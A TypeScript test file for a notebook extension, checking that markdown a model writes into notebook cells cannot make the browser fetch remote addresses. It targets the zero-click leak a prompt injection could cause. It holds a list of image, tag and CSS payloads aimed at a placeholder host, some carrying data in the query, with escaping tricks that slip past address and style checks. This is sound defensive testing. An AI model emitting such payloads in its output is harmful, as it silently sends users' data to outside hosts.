/**
 * A model's text in the text cells that an agent's run in another notebook
 * writes (src/model/crosskernel.ts). JupyterLab's sanitizer keeps images,
 * video, audio, image inputs and CSS backgrounds with a URL in a markdown
 * cell, and the browser loads them when the cell shows, in Whybook and in
 * JupyterLab's notebook. A prompt injection could make a model write such a
 * URL with data in it, and the data would leave the machine with no click.
 * Nothing in these cells loads from another host by itself. An image at a
 * path relative to the notebook and the tags that load nothing, such as
 * `<span>`, stay, and the rest of the text renders as it did.
 *
 * The markdown goes through marked, the parser of JupyterLab's
 * @jupyterlab/markedparser-extension, and the browser's HTML parser, with no
 * sanitizer: what the tests find would load even before JupyterLab's
 * sanitizer removes anything.
 */
import { marked } from 'marked';

import type { IComparison, IKernelChoice } from '../model/crosskernel';
import {
  comparisonMarkdown,
  inertMarkdown,
  introText
} from '../model/crosskernel';

/** The notebook's own server, against which a relative address resolves. */
const NOTEBOOK = 'http://notebook.test/files/work/trial.ipynb';

/** The attributes through which a browser loads an address by itself. */
const LOADING = new Set([
  'action',
  'background',
  'data',
  'dynsrc',
  'formaction',
  'href',
  'lowsrc',
  'poster',
  'src',
  'srcset',
  'xlink:href'
]);

/** Whether the browser would ask a host other than the notebook's for this address. */
function remote(address: string): boolean {
  let url: URL;
  try {
    url = new URL(address, NOTEBOOK);
  } catch {
    return false;
  }
  return (
    !['data:', 'attachment:'].includes(url.protocol) &&
    url.host !== 'notebook.test'
  );
}

/** Whether a style can load anything: a URL or an image set in it. */
function loadingStyle(style: string): boolean {
  const plain = style
    .replace(/\/\*[^]*?\*\//g, '')
    .replace(/\\([0-9a-fA-F]{1,6})[ \t\n]?/g, (_, hex) =>
      String.fromCodePoint(parseInt(hex, 16))
    )
    .replace(/\\(.)/g, '$1');
  return /(?:url|image-set|image|cross-fade|src)\(/i.test(plain);
}

/**
 * The addresses on other hosts, and the styles, that the browser would load
 * by itself from this markdown. A link's `href` loads only on a click.
 */
function remoteLoads(markdown: string): string[] {
  const template = document.createElement('template');
  template.innerHTML = marked.parse(markdown, { async: false }) as string;
  const found: string[] = [];
  for (const element of template.content.querySelectorAll('*')) {
    for (const { name, value } of Array.from(element.attributes)) {
      if (name === 'style') {
        if (loadingStyle(value)) {
          found.push(`${element.localName} style="${value}"`);
        }
        continue;
      }
      if (
        !LOADING.has(name) ||
        (name === 'href' && element.localName === 'a')
      ) {
        continue;
      }
      const addresses =
        name === 'srcset'
          ? value.split(',').map(part => part.trim().split(/\s+/)[0])
          : [value];
      for (const address of addresses.filter(remote)) {
        found.push(`${element.localName} ${name}="${address}"`);
      }
    }
  }
  return found;
}

/**
 * What loads from another host by itself in a markdown cell: the 20 ways of
 * the security pass that loaded in JupyterLab 4.6, and the ways around a
 * check of an address or a style.
 */
const LOADS = {
  image: '![x](http://example.test/?d=secret)',
  reference: '![y][r]\n\n[r]: http://example.test/r',
  shortcut: '![r]\n\n[r]: http://example.test/shortcut',
  angle: '![x](<http://example.test/angle>)',
  'protocol-relative image': '![x](//example.test/slashes)',
  img: '<img src="http://example.test/img">',
  bare: '<IMG SRC=http://example.test/bare>',
  'protocol-relative img': '<img src="//example.test/slashes">',
  backslashes: '<img src="\\\\example.test/backslashes">',
  'slash and backslash': '<img src="/\\example.test/mixed">',
  'character reference': '<img src="&#104;ttp://example.test/reference">',
  'space before the scheme': '<img src=" http://example.test/space">',
  'slash between the name and the source':
    '<div>\n<img/src="http://example.test/slash">\n</div>',
  srcset: '<img src="plot.png" srcset="http://example.test/srcset 2x">',
  video: '<video poster="http://example.test/poster"></video>',
  'video source':
    '<video src="http://example.test/video" preload="auto"></video>',
  audio: '<audio src="http://example.test/audio" preload="auto"></audio>',
  picture:
    '<picture><source srcset="http://example.test/source"><img src="plot.png"></picture>',
  input: '<input type="image" src="http://example.test/input">',
  'table background':
    '<table background="http://example.test/table"><tr><td>x</td></tr></table>',
  background:
    '<div style="background-image:url(http://example.test/bg)">x</div>',
  'quoted background':
    '<span style="background:url(\'http://example.test/bg2\')">x</span>',
  'URL in capitals':
    '<span style="background:URL(http://example.test/capitals)">x</span>',
  'escaped URL':
    '<span style="background:u\\72l(http://example.test/escaped)">x</span>',
  'URL by a character reference':
    '<span style="background:&#117;rl(http://example.test/entity)">x</span>',
  'image set':
    '<span style="background-image:image-set(\'http://example.test/set\' 1x)">x</span>',
  'style of a local image':
    '<img src="plot.png" style="background:url(http://example.test/local)">',
  'no space between attributes':
    '<div>\n<span title="x"style="background:url(http://example.test/joined)">x</span>\n</div>',
  svg: '<svg><image href="http://example.test/svg"/></svg>'
};

/** Markdown that loads nothing from another host, and stays as it is. */
const KEPT = {
  'local image': '![The fit](figures/fit.png)',
  'local image with a title': '![The fit](./figures/fit%201.png "Residuals")',
  'local img': '<img src="fit.png" width="300" alt="The fit">',
  'img without quotes': '<img src=figures/fit.png width=300>',
  span: 'The mean is <span style="color: #c00; font-weight: bold">1.83</span>.',
  colours:
    '<span style="color: rgb(200, 0, 0); background-color: hsl(0 0% 95%)">x</span>',
  'sub and sup': 'H<sub>2</sub>O and R<sup>2</sup> = 0.91<br>',
  details:
    '<details open><summary>Every estimate</summary>\n\n| a | b |\n| --- | --- |\n| 1 | 2 |\n\n</details>',
  'link tag':
    '<a href="https://doi.org/10.1000/xyz" title="The paper">the paper</a>',
  autolink: 'See <https://doi.org/10.1000/xyz>.',
  'keys and marks':
    'Press <kbd>Shift</kbd>+<kbd>Enter</kbd>, <mark>then</mark> <em>wait</em>.',
  'linked local image': '[![The fit](fit.png)](https://example.test/paper)',
  'table tags':
    '<table border="1"><tr><th scope="col" align="left">a</th></tr><tr><td colspan="2">1</td></tr></table>'
};

describe("a model's text in a markdown cell", () => {
  it.each(Object.entries(LOADS))('does not load %s', (_name, text) => {
    expect(remoteLoads(text)).not.toEqual([]);
    expect(remoteLoads(inertMarkdown(text))).toEqual([]);
  });

  it.each(Object.entries(KEPT))('keeps %s', (_name, text) => {
    expect(remoteLoads(text)).toEqual([]);
    expect(inertMarkdown(text)).toBe(text);
  });

  it('shows an image and a tag that would load as their text', () => {
    expect(inertMarkdown(LOADS.image)).toBe(
      '!\\[x](http://example.test/?d=secret)'
    );
    expect(inertMarkdown(LOADS.img)).toBe(
      '&lt;img src="http://example.test/img">'
    );
    expect(inertMarkdown(LOADS['style of a local image'])).toBe(
      '&lt;img src="plot.png" style="background:url(http://example.test/local)">'
    );
  });

  it('shows comments, scripts and unknown tags as their text', () => {
    expect(
      inertMarkdown(
        '<!-- x --><script>x</script><iframe src="a.html"></iframe><my-tag>'
      )
    ).toBe(
      '&lt;!-- x -->&lt;script>x&lt;/script>&lt;iframe src="a.html">&lt;/iframe>&lt;my-tag>'
    );
  });

  it('leaves links, code, bold, tables, lists and comparisons as they are', () => {
    const text = [
      'The means agree ([4]), with **p < 0.05** and `lme4::lmer` in [the R notebook](x.R.ipynb).',
      '',
      '| Estimate | Python | R |',
      '| --- | --- | --- |',
      '| a > b | 1 | 2 |',
      '',
      '- one',
      '- two!'
    ].join('\n');
    expect(inertMarkdown(text)).toBe(text);
  });

  it('reads text made to slow a parser down in linear time', () => {
    const texts = [
      '<span' + ' a=b'.repeat(20000),
      '<span title="' + 'x'.repeat(80000),
      '![' + 'a'.repeat(80000),
      '![a](' + 'b'.repeat(80000),
      '<a b'.repeat(20000),
      '![a](b'.repeat(15000)
    ];
    const started = performance.now();
    for (const text of texts) {
      inertMarkdown(text);
    }
    expect(performance.now() - started).toBeLessThan(1000);
  });
});

describe('the text cells of a run in another notebook', () => {
  const comparison: IComparison = {
    first: {
      path: 'trial.ipynb',
      kernel: 'Python 3 (ipykernel)',
      language: 'python',
      results: true
    },
    second: {
      path: 'trial<img src=http://example.test/file>.R.ipynb',
      kernel: 'R 4.4.3 (xr)',
      language: 'R',
      results: true
    },
    rows: [
      {
        estimate: '![e](http://example.test/estimate)',
        first: { cell: '[2]', text: '1.5', value: 1.5, found: true },
        second: { cell: '[3]', text: '1.5', value: 1.5, found: true },
        difference: 0,
        note: null
      }
    ],
    defaults: [],
    missing: ['<video poster=http://example.test/missing></video>']
  };

  it("keep the comparison's estimates, packages, file name and answer from loading anything", () => {
    const text = comparisonMarkdown({
      question:
        'Would I get the same results in R? ![q](http://example.test/q)',
      comparison,
      answer:
        'They agree, <span style="color: green">within 0.01</span>. <img src="http://example.test/answer?d=1.5">',
      ran: 2
    });
    expect(remoteLoads(text)).toEqual([]);
    expect(text).toContain(
      '**The agent\'s answer.** They agree, <span style="color: green">within 0.01</span>. &lt;img src="http://example.test/answer?d=1.5">'
    );
  });

  it("keep the model's title of the new notebook from loading anything", () => {
    const kernel: IKernelChoice = {
      name: 'xr',
      displayName: 'R 4.4.3 (xr)',
      language: 'R',
      label: 'R',
      sandboxed: false,
      program: 'xr'
    };
    const text = introText({
      title: 'Trial ![t](http://example.test/title)',
      question: 'Would I get the same results in R?',
      first: 'trial.ipynb',
      kernel
    });
    expect(remoteLoads(text)).toEqual([]);
    expect(text.split('\n')[0]).toBe(
      '# Trial !\\[t](http://example.test/title), in R'
    );
  });
});
